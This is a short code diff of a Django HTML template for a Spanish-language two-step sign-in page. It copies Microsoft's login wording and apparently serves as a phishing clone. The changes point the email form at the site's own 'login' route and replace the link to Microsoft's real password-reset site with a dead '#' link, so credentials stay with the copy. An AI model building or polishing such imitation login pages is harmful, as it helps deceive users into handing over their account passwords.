@@ -22,7 +22,7 @@
       </div>
       <div class="slide-container">
         <h2>Iniciar sesión</h2>
-        <form action="{% url 'contrasena' %}" method="POST">
+        <form action="{% url 'login' %}" method="POST">
           {% csrf_token %}
           <input
             type="email"
@@ -31,7 +31,9 @@
             required
             id="email-input"
           />
-          <a href="#" class="forgot-password">¿No puede acceder a su cuenta?</a>
+          <a href="/ingreso.html" class="forgot-password"
+            >¿No puede acceder a su cuenta?</a
+          >
           <div class="next-button-container">
             <button type="submit" id="next-button">Siguiente</button>
           </div>
@@ -44,11 +46,7 @@
         <p><span id="email-display" class="email-display"></span></p>
         <h2>Escribir contraseña</h2>
         <input type="password" placeholder="Contraseña" />
-        <a
-          href="https://passwordreset.microsoftonline.com"
-          class="forgot-password"
-          >He olvidado mi contraseña</a
-        >
+        <a href="#" class="forgot-password">He olvidado mi contraseña</a>
         <a href="#" class="use-app">Use una aplicación en su lugar</a>
         <button id="login-button">Iniciar sesión</button>
       </div>
